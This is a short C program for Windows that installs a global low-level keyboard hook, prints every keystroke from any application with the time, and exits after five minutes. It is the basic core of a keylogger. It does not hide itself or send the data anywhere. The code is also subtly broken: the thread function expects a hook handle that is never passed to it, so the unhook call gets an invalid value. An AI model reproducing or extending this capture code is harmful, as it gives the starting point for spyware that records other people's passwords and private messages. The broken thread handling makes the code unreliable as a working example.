#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <time.h>

char c;
char* winN;
SYSTEMTIME st;
time_t start, end;

DWORD WINAPI ThreadFunc(void* data, HHOOK kbd) {
	end = time(NULL);
	while (end - start < (60 * 5))
		end = time(NULL);
	UnhookWindowsHookEx(kbd);
	exit(0);
}

LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam) {

	KBDLLHOOKSTRUCT* s = (KBDLLHOOKSTRUCT*) lParam;
	switch (wParam) {
	case WM_KEYDOWN:
		c = MapVirtualKey(s->vkCode, 2);
		printf("\n%c" ,c);
		GetLocalTime(&st);
		printf(" %02d:%02d", st.wHour, st.wMinute);
		break;
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {

	HHOOK kbd = SetWindowsHookEx(13, &KBDHook, 0, 0);
	MSG message;

	if (kbd == NULL) {
		printf("Hook failed. ");
		return 0;
	}
	else {
		start = time(NULL);
		HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
		while (GetMessageW(&message, NULL, NULL, NULL))
		{
			TranslateMessage(&message);
			DispatchMessage(&message);
		}
	}

	return 0;
}